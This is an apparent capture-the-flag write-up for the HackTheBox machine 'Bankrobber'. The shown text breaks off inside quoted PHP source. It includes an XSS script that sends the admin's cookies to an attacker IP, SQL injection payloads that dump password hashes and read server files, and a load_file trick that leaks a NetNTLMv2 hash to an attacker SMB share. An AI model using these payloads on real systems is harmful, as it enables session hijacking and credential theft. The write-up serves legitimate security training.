@@ -1,0 +1,828 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Bankrobber</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-bankrobber">htb-bankrobber</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#mysql">mysql</a> <a class="post-tag" href="/tags#smb">smb</a> <a class="post-tag" href="/tags#gobuster">gobuster</a> <a class="post-tag" href="/tags#cookies">cookies</a> <a class="post-tag" href="/tags#xss">xss</a> <a class="post-tag" href="/tags#csrf">csrf</a> <a class="post-tag" href="/tags#sqli">sqli</a> <a class="post-tag" href="/tags#injection">injection</a> <a class="post-tag" href="/tags#bof">bof</a> <a class="post-tag" href="/tags#ida">ida</a> <a class="post-tag" href="/tags#chisel">chisel</a> <a class="post-tag" href="/tags#python">python</a> <a class="post-tag" href="/tags#pattern-create">pattern-create</a> <a class="post-tag" href="/tags#phantom-js">phantom-js</a> <a class="post-tag" href="/tags#reverse-engineering">reverse-engineering</a> <a class="post-tag" href="/tags#htb-giddy">htb-giddy</a> <a class="post-tag" href="/tags#htb-querier">htb-querier</a> <a class="post-tag" href="/tags#oscp-like-v2">oscp-like-v2</a> <a class="post-tag" href="/tags#oscp-like-v1">oscp-like-v1</a> </span><br/><br/>
+<time class="dt-published" datetime="2020-03-07T14:45:00+00:00" itemprop="datePublished">Mar 7, 2020
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2020/03/07/htb-bankrobber.html" style="color: #e6e6e6; text-decoration: none;">HTB: Bankrobber</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/bankrobber-cover.webp" type="image/webp"/>
+<img alt="Bankrobber" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/bankrobber-cover.png" style="float: right;margin-right:50px; margin-left:50px; width:120px; height:120px;">
+</img></picture>
+<p>BankRobber was neat because it required exploiting the same exploit twice. I’ll find a XSS vulnerability that I can use to leak the admin user’s cookie, giving me access to the admin section of the site. From there, I’ll use a SQL injection to leak the source for one of the PHP pages which shows it can provide code execution, but only accepts requests from localhost. I’ll use the same XSS vulnerability to get the admin to send that request from Bankrobber, returning a shell. To privesc to SYSTEM, I’ll find a binary running as SYSTEM and listening only on localhost. I’m not able to grab a copy of the binary as my current user, but I can create a tunnel and poke at it directly. First I’ll brute force a 4-digit pin, and then I’ll discover a simple buffer overflow that allows me to overwrite a string that is the path to an executable that’s later run. I can overwrite that myself to get a shell. In Beyond Root, I’ll look at how the XSS was automated and at the executable now that I have access.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/209 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/bankrobber" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Bankrobber</a> <a href="https://hackthebox.com/machines/bankrobber" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-bankrobber.webp" type="image/webp"/> <img alt="Bankrobber" class="img-av" src="/icons/box-bankrobber.png"/></picture></a><br/><a href="https://hackthebox.com/machines/bankrobber" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1174625681847832576">21 Sep 2019</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">07 Mar 2020</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Windows <picture><source srcset="/icons/Windows.webp" type="image/webp"/><img alt="Windows" class="img-os" src="/icons/Windows.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Insane">Insane [50]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/bankrobber-diff.webp" type="image/webp"/><img alt="Rated difficulty for Bankrobber" src="/img/bankrobber-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/bankrobber-radar.webp" type="image/webp"/><img alt="Radar chart for Bankrobber" src="/img/bankrobber-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">01:01:33</span><a href="https://app.hackthebox.com/users/9267" rel="noopener" target="_blank"><img alt="snowscan" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/9267" style="display: unset"/><span class="user-text" style="display: none"> snowscan</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">04:07:13</span><a href="https://app.hackthebox.com/users/12438" rel="noopener" target="_blank"><img alt="yuntao" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/12438" style="display: unset"/><span class="user-text" style="display: none"> yuntao</span></a><br/></td>
+</tr>
+<tr>
+<td>Creators</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/623" rel="noopener" target="_blank"><img alt="Gioo" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/623" style="display: unset"/><span class="user-text" style="display: none"> Gioo</span></a><br/> <a href="https://app.hackthebox.com/users/3244" rel="noopener" target="_blank"><img alt="Cneeliz" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/3244" style="display: unset"/><span class="user-text" style="display: none"> Cneeliz</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> shows four services, http (80), https (443), smb (445), and mysql (3306):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/alltcp 10.10.10.154
+<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-21 15:02 EDT
+Nmap scan report for 10.10.10.154
+Host is up (0.36s latency).
+Not shown: 65531 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+443/tcp  open  https
+445/tcp  open  microsoft-ds
+3306/tcp open  mysql
+
+Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds
+
+</span><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-p</span> 80,443,445,3306 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> scans/tcpscripts 10.10.10.154
+<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-21 15:03 EDT
+Nmap scan report for 10.10.10.154                                                 
+Host is up (0.044s latency).                                        
+                    
+PORT     STATE SERVICE      VERSION                                               
+80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
+|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
+|_http-title: E-coin                     
+443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
+|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
+|_http-title: E-coin                              
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   http/1.1
+|   http/1.1
+...[snip]...
+|_  http/1.1
+445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+3306/tcp open  mysql        MariaDB (unauthorized)
+Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 59m15s, deviation: 0s, median: 59m14s
+| smb-security-mode:
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2019-09-21 16:03:14
+|_  start_date: 2019-09-21 16:01:35
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1401.01 seconds
+</span></code></pre></div></div>
+<p>For some reason the https scripts got stuck and took <em>forever</em>, spitting out a ton of <code class="language-plaintext highlighter-rouge">http/1.1</code>.</p>
+<h3 id="mysql---tcp-3306">MySQL - TCP 3306</h3>
+<p>I did some basic poking at MySQL, but couldn’t find anything useful. It requires a password to connect:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>mysql <span class="nt">-h</span> 10.10.10.154 <span class="nt">--port</span> 3306
+<span class="go">ERROR 1130 (HY000): Host '10.10.14.5' is not allowed to connect to this MariaDB server
+</span></code></pre></div></div>
+<p>I guessed at a few usernames / passwords, but didn’t get anywhere.</p>
+<h3 id="smb---tcp-445">SMB - TCP 445</h3>
+<p>SMB was the same, locked down by a password:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>smbmap <span class="nt">-H</span> 10.10.10.154 <span class="nt">-u</span> 0xdf
+<span class="go">[+] Finding open SMB ports....
+[!] Authentication error occured
+[!] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[!] Authentication error on 10.10.10.154
+
+</span><span class="gp">root@kali#</span><span class="w"> </span>smbclient <span class="nt">-N</span> <span class="nt">-L</span> //10.10.10.154
+<span class="go">session setup failed: NT_STATUS_ACCESS_DENIED
+</span></code></pre></div></div>
+<h3 id="website---tcp-80443">Website - TCP 80/443</h3>
+<h4 id="site">Site</h4>
+<p>The site is a Bitcoin (or E-coin?) wallet site:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569221162488.webp" type="image/webp"/>
+<img alt="1569221162488" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569221162488.png"/>
+</picture>
+<p>I don’t have creds, but I can register and account. If I do so and submit, I’ll see the index page reload, with a small message at the top:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569221242392.webp" type="image/webp"/>
+<img alt="1569221242392" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569221242392.png"/>
+</picture>
+<p>I can now login, and I’m at my account page, which has some balance, and a form to transfer E-coin to someone else:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569221452138.webp" type="image/webp"/>
+<img alt="1569221452138" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569221452138.png"/>
+</picture>
+<p>When I put in an amount, and id number (1 seems like a safe bet), and a comment (like “test”), I get a pop up message:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569221530646.webp" type="image/webp"/>
+<img alt="1569221530646" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569221530646.png"/>
+</picture>
+<h4 id="web-directory-brute">Web Directory Brute</h4>
+<p><code class="language-plaintext highlighter-rouge">gobuster</code> identifies two interesting paths, <code class="language-plaintext highlighter-rouge">/admin</code> and <code class="language-plaintext highlighter-rouge">/user</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.154 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt <span class="nt">-o</span> scans/gobuster_root                                        
+<span class="go">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.154
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2019/09/21 15:07:34 Starting gobuster
+===============================================================
+/img (Status: 301)
+/user (Status: 301)
+/admin (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/licenses (Status: 403)
+/fonts (Status: 301)
+/%20 (Status: 403)
+/*checkout* (Status: 403)
+/phpmyadmin (Status: 403)
+/webalizer (Status: 403)
+/*docroot* (Status: 403)
+/* (Status: 403)
+/con (Status: 403)
+/http%3a (Status: 403)
+/**http%3a (Status: 403)
+/aux (Status: 403)
+/*http%3a (Status: 403)
+/%c0 (Status: 403)
+===============================================================
+2019/09/21 15:26:31 Finished
+===============================================================
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/user/</code> is where I ended up on successful login. Trying to visit <code class="language-plaintext highlighter-rouge">/admin/</code> just returns:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You're not authorized to view this page
+</code></pre></div></div>
+<h4 id="requests">Requests</h4>
+<p>Once I log in, three cookies are set in the response:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Mon, 23 Sep 2019 08:02:51 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/7.3.4</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">id=3</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">username=MHhkZg%3D%3D</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">password=MHhkZg%3D%3D</span>
+<span class="na">Location</span><span class="p">:</span> <span class="s">user</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code> cookies are just the plaintext username and password, base64 and url encoded:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span><span class="nb">echo </span><span class="nv">MHhkZg</span><span class="o">==</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="go">0xdf
+</span></code></pre></div></div>
+<p>I’ll also notice in the POST to transfer E-coin that both the to and from ids are present, with no signing, which means I can modify them. The transfer of money seems to be rejected regardless right now, and I can’t see getting rich as the point here, so I’ll leave it for now.</p>
+<h2 id="shell-as-cortin">Shell as cortin</h2>
+<h3 id="xss---admin-login">XSS - admin Login</h3>
+<p>Given the note about the the admin reviewing the transaction, it seems like an opportunity for a cross-site scripting (XSS) attack. Both the amount and id fields only submit numeric values. I can confirm in Burp by trying to put text in, and seeing that the POST does still submit, but the invalid field is empty. Better client-side validation would prevent the POST from submitting at all.</p>
+<p>I’ll test XSS in the comment field, and start my Python http server. I’ll start simple, with a couple tags to see if they connect back to me:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"10.10.14.5/test.jpg"</span> <span class="nt">/&gt;</span> <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://10.10.14.5/test.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+</code></pre></div></div>
+<p><em>A note about this XSS - it’s quite flaky. The times it takes to process, and if it processes at all varied greatly. I had good luck submitting a couple times, and if nothing came back after minute, logging out and back in, and trying again. Overall it was very frustrating to work on because it was so unreliable.</em></p>
+<p>Eventually, I see hits on my webserver for the script:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>python3 <span class="nt">-m</span> http.server 80
+<span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.154 - - [21/Sep/2019 16:10:18] code 404, message File not found
+10.10.10.154 - - [21/Sep/2019 16:10:18] "GET /test.js HTTP/1.1" 404 -
+</span></code></pre></div></div>
+<p>Perfect. It’s a bit off that the server is allowing plain script injection, but somehow isn’t loading images (hence the request for <code class="language-plaintext highlighter-rouge">test.js</code> and not <code class="language-plaintext highlighter-rouge">test.jpg</code>), but that is more likely an imperfection in the box author’s automation of the admin user than a hint (all of which is to say, were this a bug bounty or pentest, I would think differently about the result).</p>
+<p>I’ll write a <code class="language-plaintext highlighter-rouge">cookie.js</code> with the following Javascript:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">request</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">request</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">http://10.10.14.5/?test=</span><span class="dl">'</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="nx">request</span><span class="p">.</span><span class="nf">send</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Now I’ll submit again, this time with <code class="language-plaintext highlighter-rouge">cookie.js</code> in the <code class="language-plaintext highlighter-rouge">src</code>. Some number of submits and some minutes later:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.154 - - [21/Sep/2019 17:18:54] "GET /cookie.js HTTP/1.1" 200 -
+10.10.10.154 - - [21/Sep/2019 17:18:54] "GET /?test=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1" 200 - 
+</code></pre></div></div>
+<p>As I’ve seen that the cookies hold the username and password, I decode them:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span><span class="nb">echo </span><span class="nv">YWRtaW4</span><span class="o">=</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="go">admin
+</span><span class="gp">root@kali# </span><span class="nb">echo </span><span class="nv">SG9wZWxlc3Nyb21hbnRpYw</span><span class="o">==</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="go">Hopelessromantic
+</span></code></pre></div></div>
+<p>Now I can log out, and log back in with these creds. On login, this time I’m redirected to <code class="language-plaintext highlighter-rouge">/admin/</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569303360624.webp" type="image/webp"/>
+<img alt="1569303360624" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569303360624.png"/>
+</picture>
+<h3 id="admin-enumeration">/admin/ Enumeration</h3>
+<p>The <code class="language-plaintext highlighter-rouge">/admin/</code> page has additional links across the top, and three main sections where the transfer section had been on <code class="language-plaintext highlighter-rouge">/user/</code>.</p>
+<h4 id="notestxt">notes.txt</h4>
+<p>The <code class="language-plaintext highlighter-rouge">NOTES.TXT</code> link leads to <code class="language-plaintext highlighter-rouge">/notes.txt</code>, which returns a text file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Move all files from the default Xampp folder: TODO
+- Encode comments for every IP address except localhost: Done
+- Take a break..
+</code></pre></div></div>
+<p>I’ll take two things from this:</p>
+<ul>
+<li>I can assume that the web directory is <code class="language-plaintext highlighter-rouge">C:\xampp\htdocs\</code> on Bankrobber.</li>
+<li>I’m not sure exactly what it means by encoding comments, but there’s definitely behavior that is different coming from localhost.</li>
+</ul>
+<h4 id="transactions">Transactions</h4>
+<p>Next I’ll see the “Transactions waiting for approval.” section. If I open a private browser session and log in as my user, and submit a transaction, I will see it here:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569303812747.webp" type="image/webp"/>
+<img alt="1569303812747" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569303812747.png"/>
+</picture>
+<p>I took a look at the buttons, but they just reload <code class="language-plaintext highlighter-rouge">/admin/</code> with no further action. I’ll note that the XSS payload that worked against the admin isn’t working against me. This is likely another artifact of HTB. As a box maker, you don’t want the XSS firing against all the other HTB users who load the page. It isn’t that unrealistic anyway, as the admin could have a different interface to approve / deny transactions that could be vulnerable to different kinds of attacks.</p>
+<h4 id="search-users">Search Users</h4>
+<p>The “Search users (beta)” section allows me to search for a user id and get the name associated with it:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569304087785.webp" type="image/webp"/>
+<img alt="1569304087785" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569304087785.png"/>
+</picture>
+<p>If I search for “1”, it does a POST to <code class="language-plaintext highlighter-rouge">/admin/search.php</code> with the payload <code class="language-plaintext highlighter-rouge">term=1</code>.</p>
+<h4 id="backdoorcheker">Backdoorcheker</h4>
+<p>The last section is Backdoorchecker, which says:</p>
+<blockquote>
+<p>﻿To quickly identify backdoors located on our server;
+ we implemented this function.
+ For safety issues you’re only allowed to run the ‘dir’ command with any arguments.</p>
+</blockquote>
+<p>It says it’s limited to the <code class="language-plaintext highlighter-rouge">dir</code> command, but I feel confident I can work around that and inject other commands. Unfortunately, running it is also limited to localhost:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569304377464.webp" type="image/webp"/>
+<img alt="1569304377464" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569304377464.png"/>
+</picture>
+<p>At first I thought that might be local input filtering, but this does send a POST to <code class="language-plaintext highlighter-rouge">/admin/backdoorchecker.php</code> with the payload <code class="language-plaintext highlighter-rouge">cmd=dir</code>, and the response from the server is the message about localhost.</p>
+<h3 id="sqli---file-access">SQLI - File Access</h3>
+<p>On playing with the users search, I quickly identified a potential SQLI:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569305049405.webp" type="image/webp"/>
+<img alt="1569305049405" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569305049405.png"/>
+</picture>
+<p>Now I can access a lot of stuff. First, all the users:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569305169999.webp" type="image/webp"/>
+<img alt="1569305169999" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569305169999.png"/>
+</picture>
+<p>Now I’ll try for a <code class="language-plaintext highlighter-rouge">UNION</code> injection. I’ll need to know how many columns. <code class="language-plaintext highlighter-rouge">SELECT 1</code> and <code class="language-plaintext highlighter-rouge">SELECT 1,2</code> returns errors, but <code class="language-plaintext highlighter-rouge">1,2,3</code> works:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569305297185.webp" type="image/webp"/>
+<img alt="1569305297185" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569305297185.png"/>
+</picture>
+<p>There are three columns, and the value in 1 and 2 are returned to me. I can get the version and current user:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569305498542.webp" type="image/webp"/>
+<img alt="1569305498542" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569305498542.png"/>
+</picture>
+<p>On enumerating the database using various commands (<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">this page</a> is a good reference), I didn’t find much of interest in the database. I did pull the hashes for authentication to MySQL with <code class="language-plaintext highlighter-rouge">10' UNION SELECT user,password,3 from mysql.user;-- -</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569305663110.webp" type="image/webp"/>
+<img alt="1569305663110" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569305663110.png"/>
+</picture>
+<p>I was unable to break this with hashcat.</p>
+<p>I also successfully got a NetNTLMv2 hash for the user (just like in <a href="/2019/02/16/htb-giddy.html#get-net-ntlm">Giddy</a> and <a href="/2019/06/22/htb-querier.html#capture-net-ntlmv2">Querier</a>) by starting <code class="language-plaintext highlighter-rouge">responder</code> and submitting <code class="language-plaintext highlighter-rouge">term=10' UNION SELECT 1,load_file('\\\\10.10.14.5\\test'),3-- -</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">[+] Listening for events...
+[SMBv2] NTLMv2-SSP Client   : 10.10.10.154
+[SMBv2] NTLMv2-SSP Username : BANKROBBER\Cortin
+[SMBv2] NTLMv2-SSP Hash     : Cortin::BANKROBBER:8e03eb65c1ff7440:B6A365E18C306FF457C7B2E133E71AC6:0101000000000000C0653150DE09D201A9520A6CF259AB64000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000200000651BA4D76C8F5FB4DB2D21ED382782CB4FC0762AE6F5272B06ED51D958033E6C0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003500000000000000000000000000
+[*] Skipping previously captured hash for BANKROBBER\Cortin
+</span></code></pre></div></div>
+<p>I was also unable to break that with hashcat.</p>
+<p>I could use this username and the sqli to grab <code class="language-plaintext highlighter-rouge">user.txt</code> (though I didn’t think of this when solving the box, props to shelly shocker for pointing this one out):</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569306019082.webp" type="image/webp"/>
+<img alt="1569306019082" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569306019082.png"/>
+</picture>
+<p>I did start to look at the source for the site, and specifically <code class="language-plaintext highlighter-rouge">/admin/backdoorchecker.php</code>, with the SQLI <code class="language-plaintext highlighter-rouge">10' UNION SELECT 1,load_file('c:\\xampp\\htdocs\\admin\\backdoorchecker.php'),3;-- -</code>. I got the following source:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">include</span><span class="p">(</span><span class="s1">'../link.php'</span><span class="p">);</span>
+<span class="k">include</span><span class="p">(</span><span class="s1">'auth.php'</span><span class="p">);</span>
+
+<span class="nv">$username</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]));</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]));</span>
+<span class="nv">$bad</span>       <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'$('</span><span class="p">,</span><span class="s1">'&amp;'</span><span class="p">);</span>
+<span class="nv">$good</span>       <span class="o">=</span> <span class="s2">"ls"</span><span class="p">;</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="kc">PHP_OS</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">))</span> <span class="o">==</span> <span class="s2">"win"</span><span class="p">){</span>
+    <span class="nv">$good</span> <span class="o">=</span> <span class="s2">"dir"</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$username</span> <span class="o">==</span> <span class="s2">"admin"</span> <span class="o">&amp;&amp;</span> <span class="nv">$password</span> <span class="o">==</span> <span class="s2">"Hopelessromantic"</span><span class="p">){</span>
+    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])){</span>
+            <span class="c1">// FILTER ESCAPE CHARS</span>
+            <span class="k">foreach</span><span class="p">(</span><span class="nv">$bad</span> <span class="k">as</span> <span class="nv">$char</span><span class="p">){</span>
+                <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">],</span><span class="nv">$char</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">){</span>
+                    <span class="k">die</span><span class="p">(</span><span class="s2">"You're not allowed to do that."</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+            <span class="c1">// CHECK IF THE FIRST 2 CHARS ARE LS</span>
